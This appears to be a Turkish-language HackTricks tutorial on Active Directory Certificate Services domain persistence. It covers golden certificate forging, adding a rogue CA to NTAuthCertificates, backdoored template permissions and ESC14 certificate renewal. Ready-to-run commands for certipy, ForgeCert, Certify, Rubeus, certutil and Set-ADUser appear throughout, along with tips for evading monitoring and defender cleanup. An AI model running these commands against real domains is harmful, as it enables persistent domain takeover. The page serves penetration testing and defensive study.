# AD CS Domain Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Bu, [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) içinde paylaşılan domain persistence tekniklerinin özetidir**. Daha fazla ayrıntı için belgeyi inceleyin.<sup>[[5]](#references)</sup>

## Çalınan CA Certificates ile Certificate Forging (Golden Certificate) - DPERSIST1

Bir certificate'in CA certificate olduğunu nasıl anlarsınız?

Bir certificate'in CA certificate olduğu, birkaç koşulun karşılanmasıyla belirlenebilir:<sup>[[5]](#references)</sup>

- Certificate, private key'i işletim sistemi destekliyorsa makinenin DPAPI'si veya TPM/HSM gibi donanımlar tarafından korunan şekilde CA server'da saklanır.
- Certificate'in Issuer ve Subject alanları, CA'nın distinguished name'i ile eşleşir.
- Yalnızca CA certificates içinde bir "CA Version" extension bulunur.
- Certificate'te Extended Key Usage (EKU) alanları bulunmaz.

Bu certificate'in private key'ini çıkarmak için, CA server'daki `certsrv.msc` aracı, yerleşik GUI üzerinden desteklenen yöntemdir. Bununla birlikte, bu certificate sistemde saklanan diğerlerinden farklı değildir; bu nedenle, çıkarma için [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) gibi yöntemler uygulanabilir.

Certificate ve private key, aşağıdaki komutla Certipy kullanılarak da elde edilebilir:<sup>[[2]](#references)</sup>

```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```

CA sertifikası ve özel anahtarı `.pfx` formatında elde ettikten sonra, [ForgeCert](https://github.com/GhostPack/ForgeCert) gibi araçlar geçerli sertifikalar oluşturmak için kullanılabilir:

```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```

> [!WARNING]
> Certificate forgery için hedeflenen kullanıcının etkin olması ve işlemin başarılı olması için Active Directory'de kimlik doğrulaması yapabilmesi gerekir. krbtgt gibi özel hesaplar için sertifika oluşturmak etkisizdir.

Bu sahte sertifika, belirtilen bitiş tarihine kadar ve **root CA sertifikası geçerli olduğu sürece** (**genellikle 5 ila 10+ yıl**) **geçerli** olacaktır. Ayrıca **makineler** için de geçerlidir; bu nedenle **S4U2Self** ile birlikte kullanıldığında saldırgan, CA sertifikası geçerli olduğu sürece **herhangi bir etki alanı makinesinde persistence sağlayabilir**.\
Ayrıca, bu yöntemle **oluşturulan sertifikalar**, CA bunlardan haberdar olmadığı için **iptal edilemez**.

### Strong Certificate Mapping Enforcement kapsamında çalışma (2025+)

11 Şubat 2025'ten bu yana (KB5014754 dağıtımından sonra), etki alanı denetleyicileri sertifika eşlemeleri için varsayılan olarak **Full Enforcement** kullanıyor. Uygulamada bu, sahte sertifikalarınızın aşağıdakilerden birini yapması gerektiği anlamına gelir:

- Hedef hesaba güçlü bir bağ içermesi (örneğin, SID güvenlik uzantısı) veya
- Hedef nesnenin `altSecurityIdentities` özniteliğinde güçlü, açık bir eşlemeyle eşleştirilmesi.<sup>[[1]](#references)</sup>

Persistence için güvenilir bir yaklaşım, çalınan Enterprise CA'ya zincirlenen sahte bir sertifika oluşturup ardından kurban asıl hesabına güçlü, açık bir eşleme eklemektir:

```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```

Notlar
- SID security extension'ı içeren sahte sertifikalar oluşturabiliyorsanız, bunlar Full Enforcement altında bile örtük olarak eşleşir. Aksi takdirde, açık strong mapping'leri tercih edin. Açık mapping'ler hakkında daha fazla bilgi için [account-persistence](account-persistence.md) sayfasına bakın.
- Revocation burada savunmacılara yardımcı olmaz: sahte sertifikalar CA database'inde bilinmediğinden iptal edilemez.

#### Full-Enforcement uyumlu sahte sertifika oluşturma (SID-aware)

Güncellenen araçlar SID'yi doğrudan sertifikaya eklemenizi sağlar. Böylece DC'ler zayıf mapping'leri reddetse bile golden certificates kullanılabilir:<sup>[[3]](#references)</sup>

```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
  --upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
  --outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
  -sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```

SID'yi gömerek, güçlü eşleme kontrollerini karşılamaya devam ederken izleniyor olabilecek `altSecurityIdentities` alanına dokunmaktan kaçınırsınız.

## Rogue CA Certificates'a Güvenme - DPERSIST2

`NTAuthCertificates` nesnesi, Active Directory'nin (AD) kullandığı `cacertificate` özniteliğinde bir veya daha fazla **CA certificate** içerecek şekilde tanımlanmıştır. **Domain controller**, doğrulama sürecinde kimlik doğrulaması yapan **certificate**'ın Issuer alanında belirtilen **CA** ile eşleşen bir kayıt olup olmadığını `NTAuthCertificates` nesnesinde kontrol eder. Eşleşme bulunursa kimlik doğrulama devam eder.<sup>[[5]](#references)</sup>

Saldırgan, bu AD nesnesi üzerinde denetime sahipse, kendi imzaladığı bir CA certificate'ı `NTAuthCertificates` nesnesine ekleyebilir. Normalde bu nesneyi değiştirme izni yalnızca **Enterprise Admin** grubunun üyelerine ve **forest root domain**'indeki **Domain Admins** veya **Administrators** üyelerine verilir. Bu kişiler `certutil.exe` aracını `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA` komutuyla kullanarak veya [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool) aracılığıyla `NTAuthCertificates` nesnesini düzenleyebilir.

Bu teknik için faydalı diğer komutlar:

```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```

Bu özellik, özellikle daha önce açıklanan ve sertifikaları dinamik olarak oluşturmak için ForgeCert kullanan yöntemle birlikte kullanıldığında oldukça önemlidir.

> 2025 sonrası eşleştirme değerlendirmeleri: NTAuth'a rogue CA eklemek yalnızca düzenleyen CA'ya güven tesis eder. DC'ler **Full Enforcement** modundayken oturum açmak için leaf sertifikalarını kullanabilmek için leaf sertifikasında SID güvenlik uzantısı bulunmalı veya hedef nesnede güçlü bir açık eşleştirme olmalıdır (örneğin, `altSecurityIdentities` içinde Issuer+Serial). Bkz. {{#ref}}account-persistence.md{{#endref}}.

## Kötü Amaçlı Yanlış Yapılandırma - DPERSIST3

AD CS bileşenlerinin **security descriptor** değişiklikleri yoluyla **persistence** elde etme fırsatları oldukça fazladır. "[Domain Escalation](domain-escalation.md)" bölümünde açıklanan değişiklikler, yükseltilmiş erişime sahip bir saldırgan tarafından kötü amaçlı şekilde uygulanabilir. Buna, aşağıdakiler gibi hassas bileşenlere "control rights" (ör. WriteOwner/WriteDACL vb.) eklemek dahildir:<sup>[[5]](#references)</sup>

- **CA sunucusunun AD bilgisayar** nesnesi
- **CA sunucusunun RPC/DCOM sunucusu**
- **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** içindeki tüm **alt AD nesneleri veya kapsayıcıları** (örneğin Certificate Templates kapsayıcısı, Certification Authorities kapsayıcısı, NTAuthCertificates nesnesi vb.)
- Kuruluş tarafından CA veya şablon denetim hakları açıkça devredilmiş **AD grupları**. Yerleşik Cert Publishers grubu, AD'deki kullanıcı nesnelerine sertifika yayımlama yetkisine sahiptir; ancak yalnızca üyelik, CA veya şablon denetimi ya da enrollment hakları vermez. İlgili CA ve şablon izinlerini ayrı ayrı denetleyin. Bkz. [Microsoft'un Cert Publishers açıklaması](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers) ve [sertifika şablonu izinleri](https://learn.microsoft.com/en-us/intune/configmgr/protect/plan-design/planning-for-certificate-template-permissions).

Kötü amaçlı bir uygulama örneğinde, etki alanında **yükseltilmiş izinlere** sahip bir saldırgan, varsayılan **`User`** sertifika şablonuna **`WriteOwner`** iznini ekler ve bu hak için saldırganı sorumlu olarak belirler. Bundan yararlanmak için saldırgan önce **`User`** şablonunun sahipliğini kendisine geçirir. Ardından şablondaki **`mspki-certificate-name-flag`** değeri **1** olarak ayarlanarak **`ENROLLEE_SUPPLIES_SUBJECT`** etkinleştirilir ve böylece kullanıcının istekte bir Subject Alternative Name sağlamasına izin verilir. Sonrasında saldırgan şablonu kullanarak **enroll** olabilir, alternatif ad olarak bir **etki alanı yöneticisinin** adını seçebilir ve elde ettiği sertifikayı DA olarak kimlik doğrulamak için kullanabilir.

Saldırganların uzun süreli etki alanı persistence için ayarlayabileceği pratik seçenekler (tüm ayrıntılar ve tespit için bkz. {{#ref}}domain-escalation.md{{#endref}}):

- İstek sahiplerinden SAN kabul edilmesini sağlayan CA policy flag'leri (ör. `EDITF_ATTRIBUTESUBJECTALTNAME2` etkinleştirmek). Bu, ESC1 benzeri yolların kullanılabilir kalmasını sağlar.
- Kimlik doğrulamayı destekleyen sertifika verilmesine izin veren şablon DACL'leri veya ayarları (ör. Client Authentication EKU eklemek, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` etkinleştirmek).
- Savunmacılar temizleme girişiminde bulunursa rogue issuer'ları yeniden eklemeyi sürdürmek için `NTAuthCertificates` nesnesini veya CA kapsayıcılarını denetlemek.

> [!TIP]
> KB5014754 sonrası güçlendirilmiş ortamlarda, bu yanlış yapılandırmaları açık güçlü eşleştirmelerle (`altSecurityIdentities`) birlikte kullanmak, DC'ler güçlü eşleştirmeyi zorunlu kılsa bile verilen veya sahte sertifikalarınızın kullanılabilir kalmasını sağlar.

### Persistence için sertifika yenileme kötüye kullanımı (ESC14)

Kimlik doğrulama yapabilen bir sertifikayı (veya bir Enrollment Agent sertifikasını) ele geçirirseniz, veren şablon yayımlanmaya devam ettiği ve CA veren sertifika zincirine güvenmeyi sürdürdüğü sürece sertifikayı **süresiz olarak yenileyebilirsiniz**. Yenileme, orijinal kimlik bağlarını korurken geçerlilik süresini uzatır; bu da şablon düzeltilmediği veya CA yeniden yayımlanmadığı sürece saldırganın sistemden çıkarılmasını zorlaştırır.<sup>[[4]](#references)</sup>

```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```

If domain controller'lar **Full Enforcement** durumundaysa, yenilenen leaf sertifikanın `altSecurityIdentities` değerine dokunmadan güçlü eşleşmeye devam etmesi için `-sid <victim SID>` ekleyin (veya SID security extension'ı içermeye devam eden bir template kullanın). CA admin yetkilerine sahip saldırganlar, kendilerine sertifika vermeden önce yenilenen sertifikaların geçerlilik süresini uzatmak için `policy\RenewalValidityPeriodUnits` değerini de değiştirebilir.<sup>[[2]](#references)[[4]](#references)</sup>


## References

- [1] [Microsoft KB5014754 – Windows domain controller'larda sertifika tabanlı kimlik doğrulama değişiklikleri (uygulama zaman çizelgesi ve güçlü eşleştirmeler)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [Certipy – Komut referansı ve forge/auth kullanımı](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [3] [SpecterOps – Certify 2.0 (SID desteğine sahip entegre forge)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [ESC14 yenileme suistimaline genel bakış](https://www.adcs-security.com/attacks/esc14)
- [5] [SpecterOps – Certified Pre-Owned: Active Directory Certificate Services'ın suistimali](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
{{#include ../../../banners/hacktricks-training.md}}
